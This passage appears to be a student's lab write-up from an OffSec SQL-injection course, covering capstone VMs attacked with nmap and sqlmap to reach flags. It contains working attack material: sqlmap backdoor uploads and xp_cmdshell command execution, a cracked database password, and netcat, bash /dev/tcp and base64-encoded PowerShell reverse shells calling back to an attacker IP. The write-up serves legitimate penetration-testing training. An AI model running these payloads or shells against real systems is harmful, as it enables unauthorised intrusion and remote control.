man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:113:MySQL Server,,,:/var/lib/mysql:/bin/false

# So only root has a login shell, we can't write to /root

# We can execute commands as www-data

...
[15:42:22] [INFO] trying to upload the file stager on '/var/www/html/' via UNION method
[15:42:22] [INFO] the remote file '/var/www/html/tmpurvjl.php' is larger (710 B) than the local file '/tmp/sqlmap2ld_ye3p378836/tmpfjcm5_2g' (705B)
[15:42:23] [INFO] the file stager has been successfully uploaded on '/var/www/html/' - http://192.168.212.48:80/tmpurvjl.php
[15:42:23] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://192.168.212.48:80/tmpbnlcn.php
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: 'www-data'
...


┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ sqlmap -r sub.req -p "mail-list" --dbms=MySQL --technique=EUSQ --batch --exclude-sysdbs --priv-esc --os-cmd="which bash"

...
[15:45:32] [INFO] the backdoor has been successfully uploaded on '/var/www/html/' - http://192.168.212.48:80/tmpblebi.php
do you want to retrieve the command standard output? [Y/n/a] Y
command standard output: '/usr/bin/bash'
[15:45:32] [INFO] cleaning up the web files uploaded
...


# Found that target has netcat available!

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ sqlmap -r sub.req -p "mail-list" --dbms=MySQL --technique=EUSQ --batch --exclude-sysdbs --os-cmd='nc -h'  


# NC returned a rev shell!

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ sqlmap -r sub.req -p "mail-list" --dbms=MySQL --technique=EUSQ --batch --exclude-sysdbs --os-cmd='nc 192.168.45.223 4444 -e /usr/bin/bash'


┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-5]
└─$ nc -nvlp 4444              
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.212.48] 58664


# Found flag on dir up in /var/www

ls /var/www
flag.txt
html
cat /var/www/flag.txt
OS{42c0d162385627b8b4ffa06e3d149ea9}
```


Capstone Exercise: Enumerate the Module Exercise - VM #3 and exploit the SQLi vulnerability in order to get the flag.
```
┌──(operator㉿labhost)-[~/OffSec/sqli]
└─$ sudo nmap -sS -sV 192.168.212.49
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-05 16:23 PDT
Nmap scan report for 192.168.212.49
Host is up (0.078s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.54 ((Debian))
5432/tcp open  postgresql PostgreSQL DB 9.6.0 or later
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port5432-TCP:V=7.94%I=7%D=9/5%Time=64F7B891%P=x86_64-pc-linux-gnu%r(SMB
SF:ProgNeg,8C,"E\0\0\0\x8bSFATAL\0VFATAL\0C0A000\0Munsupported\x20frontend
SF:\x20protocol\x2065363\.19778:\x20server\x20supports\x202\.0\x20to\x203\
SF:.0\0Fpostmaster\.c\0L2127\0RProcessStartupPacket\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.81 seconds


# Started browsing with Burp
# Found interesting POST on class.php and contact.php

# Installed Jython jar and SQLiPy Burp extension
# Found class.php injectable, contant.php not

back-end DBMS: PostgreSQL
PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit
banner: 'PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit'

#
#### Honed in with sqlmap, opted to crack md5 with rockyou.txt
#

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-6]
└─$ sqlmap -r class.req --technique=ESQU -a --exclude-sysdbs

web server operating system: Linux Debian
web application technology: Apache 2.4.54
back-end DBMS operating system: Linux Debian
back-end DBMS: PostgreSQL
banner: 'PostgreSQL 13.7 (Debian 13.7-0+deb11u1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 10.2.1-6) 10.2.1 20210110, 64-bit'
current user: 'rubben'
current database (equivalent to schema on PostgreSQL): 'public'
current user is DBA: True
database management system users [2]:
[*] postgres
[*] rubben

database management system users password hashes:
[*] postgres [1]:
    password hash: NULL
[*] rubben [1]:
    password hash: md5ae8c67affdb169a42c9631c02fc67ede
    clear-text password: avrillavigne

database management system users privileges:
[*] postgres (administrator) [2]:
    privilege: createdb
    privilege: super
[*] rubben (administrator) [1]:
    privilege: super

database management system users roles:
[*] postgres (administrator) [2]:
    role: createdb
    role: super
[*] rubben (administrator) [1]:
    role: super

Database: public
Table: users
[4 entries]
+----------------+--------+--------+--------+----------+----------------------------+
| email          | gender | height | weight | active   | created_at                 |
+----------------+--------+--------+--------+----------+----------------------------+
| dave@lab.lab   | male   | 342    | 40     | no       | 2022-06-20 13:50:16.481982 |
| Selena@lab.lab | male   | 322    | 34     | no       | 2022-06-20 13:49:59.408325 |
| skrill@lab.lab | male   | 64     | 40     | yes      | 2022-06-20 13:08:41.095354 |
| steve@lab.lab  | male   | 234    | 54     | yes      | 2022-06-20 13:50:08.404948 |
+----------------+--------+--------+--------+----------+----------------------------+


# Tested --os-cmd, works in context of postgres user
# netcat present and bash in path
# Fired off bash reverse shell, success!

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-6]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.45.223] from (UNKNOWN) [192.168.212.49] 32830
bash: cannot set terminal process group (2664): Inappropriate ioctl for device
bash: no job control in this shell
postgres@glove-gym:/var/lib/postgresql/13/main$

postgres@glove-gym:/var/lib$ cd /var/www	
cd /var/www
postgres@glove-gym:/var/www$ ls
ls
flag.txt
html
postgres@glove-gym:/var/www$ cat flag.txt
cat flag.txt
OS{78e9846e2346582bfc14a5d39c6ab01e}

# Found the flag.txt in /var/www!!!

OS{78e9846e2346582bfc14a5d39c6ab01e}

```


Capstone Exercise: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability in order to get the flag.
```
┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-7]
└─$ sudo nmap -sS -sV 192.168.212.50
[sudo] password for operator: 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-06 07:41 PDT
Nmap scan report for 192.168.212.50
Host is up (0.079s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE       VERSION
80/tcp  open  http          Microsoft IIS httpd 10.0
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds


#
####  Identified vulnerable fields with Burp, honed in with sqlmap
# UsernameTextBox vulnerable to stacked queries

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-7]
└─$ sqlmap -u "http://192.168.212.50:80/login.aspx" --data="__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=test&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test123&ctl00%24ContentPlaceHolder1%24LoginButton=Login" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36" --referer="http://192.168.212.50/login.aspx" --delay=0 --timeout=30 --retries=0 --level=3 --risk=1 --threads=6 --time-sec=5 --technique=EUSQ

...
Parameter: ctl00$ContentPlaceHolder1$UsernameTextBox (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: __VIEWSTATE=/wEPDwUKMjA3MTgxMTM4N2Rkqwqg/oL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4=&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=/wEdAAS/uzRgA9bOZgZWuL94SJbKG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ+fPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH+M50=&ctl00$ContentPlaceHolder1$UsernameTextBox=test';WAITFOR DELAY '0:0:5'--&ctl00$ContentPlaceHolder1$PasswordTextBox=test123&ctl00$ContentPlaceHolder1$LoginButton=Login
---
web server operating system: Windows 11 or 2022 or 2019 or 10 or 2016
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2019
...

current user: 'sa'
current database: 'webapp'
hostname: 'WINSERV22-TEMP\SQLEXPRESS'
current user is DBA: True
database management system users [15]:
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] BUILTIN\\Users
[*] NT AUTHORITY\\SYSTEM
[*] NT Service\\MSSQL$SQLEXPRESS
[*] NT SERVICE\\SQLTELEMETRY$SQLEXPRESS
[*] NT SERVICE\\SQLWriter
[*] NT SERVICE\\Winmgmt
[*] sa
[*] WINSERV22-TEMP\\Administrator

database management system users password hashes:
[*] BUILTIN\\Users [1]:
    password hash: NULL

database management system users privileges:
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] BUILTIN\\Users
[*] NT AUTHORITY\\SYSTEM
[*] NT Service\\MSSQL$SQLEXPRESS
[*] NT SERVICE\\SQLTELEMETRY$SQLEXPRESS
[*] NT SERVICE\\SQLWriter
[*] NT SERVICE\\Winmgmt
[*] sa (administrator)
[*] WINSERV22-TEMP\\Administrator

database management system users roles:
[*] ##MS_PolicyEventProcessingLogin##
[*] ##MS_PolicySigningCertificate##
[*] ##MS_PolicyTsqlExecutionLogin##
[*] ##MS_SmoExtendedSigningCertificate##
[*] ##MS_SQLAuthenticatorCertificate##
[*] ##MS_SQLReplicationSigningCertificate##
[*] ##MS_SQLResourceSigningCertificate##
[*] BUILTIN\\Users
[*] NT AUTHORITY\\SYSTEM
[*] NT Service\\MSSQL$SQLEXPRESS
[*] NT SERVICE\\SQLTELEMETRY$SQLEXPRESS
[*] NT SERVICE\\SQLWriter
[*] NT SERVICE\\Winmgmt
[*] sa (administrator)
[*] WINSERV22-TEMP\\Administrator

Database: webapp
Table: users
[0 entries]
+----------+----------+
| password | username |
+----------+----------+
+----------+----------+


# Enabled xp_cmdshell with sqlmap

┌──(operator㉿labhost)-[~/OffSec/sqli/capstone-10.3-7]
└─$ sqlmap -u "http://192.168.212.50:80/login.aspx" --data="__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=test&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test123&ctl00%24ContentPlaceHolder1%24LoginButton=Login" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36" --referer="http://192.168.212.50/login.aspx" --level=3 --risk=1 --threads=6 --time-sec=5 --technique=SU --os-cmd=whoami

...
[10:23:14] [INFO] retrieved:  
command standard output: 'nt service\mssql$sqlexpress'
[10:23:46] [INFO] cleaning up the database management system
do you want to remove UDF 'master..new_xp_cmdshell'? [Y/n] n
...


# Check if powershell

(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell


# CMD exec, let's upload powercat.ps1
# Tried a few paths but no write permissions...


# Let's try to encode a powershell rev-shell one-liner, pass it in through --os-cmd, then use powershell to decode and execute with Invoke-Expression (iex)

# Used PowerShell base64 encoded rev shell command below
# Returned shell to netcat! Used Get-ChildItem commandlet to find flag :-)

PS C:\Windows\system32> Get-Childitem flag.txt -Path C:\ -Recurse


    Directory: C:\inetpub\wwwroot


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          9/6/2023  10:39 AM             78 flag.txt                                                             
PS C:\Windows\system32> cat C:\inetpub\wwwroot\flag.txt
OS{d9952bc138c971cb55bb4ff266e4a008}

# Got the loot!

OS{d9952bc138c971cb55bb4ff266e4a008}

```


**Shells**
```
'/usr/bin/bash -c "bash -i >& /dev/tcp/192.168.45.223/4444 0>&1"'

'nc 192.168.45.223 4444 -e /usr/bin/bash'


# Powershell

┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.223",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)

┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $EncodedText =[Convert]::ToBase64String($Bytes)

┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> @EncodedText
ParserError: 
Line |
   1 |  @EncodedText
     |  ~~~~~~~~~~~~
     | The splatting operator '@' cannot be used to reference variables in an
     | expression. '@EncodedText' can be used only as an argument to a
     | command. To reference variables in an expression use '$EncodedText'.


┌──(operator㉿labhost)-[/home/operator/OffSec/sqli]
└─PS> $EncodedText
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIAMgAzACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==


# To exec on target

powershell -enc JABjAGwAaQBlAG4A...

```
